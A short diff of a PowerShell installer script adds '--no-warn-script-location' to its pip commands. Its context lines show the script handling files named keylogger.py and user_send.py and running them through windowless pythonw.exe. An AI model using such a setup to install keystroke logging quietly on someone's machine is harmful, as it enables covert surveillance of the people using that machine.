@@ -30,8 +30,8 @@ foreach ($f in "keylogger.py","survey.py","user_send.py","updater.py","app_paths
 
 $req = Join-Path $dir "client-requirements.txt"
 Get-Content (Join-Path $dir "requirements.txt") | Where-Object { $_ -notmatch "^(?i)(flask|waitress|pyinstaller)" } | Set-Content $req
-& $python -m pip install --upgrade pip --quiet
-& $python -m pip install -r $req --quiet
+& $python -m pip install --upgrade pip --quiet --no-warn-script-location
+& $python -m pip install -r $req --quiet --no-warn-script-location
 if ($LASTEXITCODE -ne 0) { throw "Dependency install failed - nothing was registered." }
 
 $pythonw = Join-Path (Split-Path $python) "pythonw.exe"
